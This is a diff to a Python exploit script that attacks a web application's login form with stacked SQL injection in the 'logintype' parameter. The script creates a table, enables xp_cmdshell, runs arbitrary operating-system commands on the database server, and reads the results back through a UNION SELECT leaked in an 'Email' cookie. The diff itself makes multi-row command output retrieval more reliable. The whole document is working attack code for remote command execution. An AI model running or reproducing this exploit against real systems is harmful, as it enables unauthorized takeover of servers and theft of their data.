@@ -57,7 +57,7 @@ def random_table_name():
     return rand
 
 def create_table(session, url, table_name):
-    payload = f"3;CREATE TABLE {table_name} (output NVARCHAR(2048));-- -"
+    payload = f"3;CREATE TABLE {table_name} (id INT IDENTITY(1,1) PRIMARY KEY, output NVARCHAR(2048));-- -"
     DATA["logintype"] = payload 
     r = session.post(url, data=DATA, allow_redirects=False)
 
@@ -71,17 +71,16 @@ def enable_xp_cmdshell(session, url):
     return r.status_code
 
 def execute_command(session, url, table_name, command):
-    payload = f"3;DELETE FROM {table_name};INSERT INTO {table_name} (output) exec Xp_CmdSHell \"{command}\";-- -"
+    payload = f"3;TRUNCATE TABLE {table_name};INSERT INTO {table_name} (output) exec Xp_CmdSHell \"{command}\";-- -"
     DATA["logintype"] = payload 
     r = session.post(url, data=DATA, allow_redirects=False)
 
     return r.status_code
 
-def get_output(session, url, table_name):
-    payload = f"3 UNION SELECT 5,4,3,2,(SELECT TOP 1 output from {table_name}), 1;-- -"
+def read_mail(session, url, table_name, payload):
     DATA["logintype"] = payload 
     r = session.post(url, data=DATA, allow_redirects=False)
-     
+ 
     if r.status_code == 302:
         set_cookies = r.headers["Set-Cookie"]
         out_start = set_cookies.find('Email=') + 6
@@ -92,6 +91,25 @@ def get_output(session, url, table_name):
         return output.decode()
     else:
         return None
+
+def get_index(session, url, table_name):
+    payload = f"3 UNION SELECT 5,4,3,2,(SELECT TOP 1 id from {table_name} ORDER BY id DESC), 1;-- -"
+    return(read_mail(session, url, table_name, payload))
+
+def get_output(session, url, table_name, index):
+    payload = f"3 UNION SELECT 5,4,3,2,(SELECT TOP 1 output from {table_name} WHERE id = {index}), 1;-- -"
+    return(read_mail(session, url, table_name, payload))
+def get_output_all(session, url, table_name):
+    index = get_index(session, url, table_name)
+    if index is None:
+        return None
+
+    command_output = ""
+    for i in range(1, int(index) + 1):
+        out = get_output(session, url, table_name, i)
+        if out is not None:
+            command_output += out + '\n'
+    return command_output
 
 def drop_table(session, url, table_name):
     payload = f"3;DROP TABLE {table_name};-- -"
@@ -140,10 +158,9 @@ if __name__ == "__main__":
                 prints("Failed to execute command")
                 break
 
-            rc = get_output(session, target_url, TABLE_NAME)
+            rc = get_output_all(session, target_url, TABLE_NAME)
             if rc is None:
                 printe("Failed to get output")
-                break
             else:
                 print(rc)
     except KeyboardInterrupt:
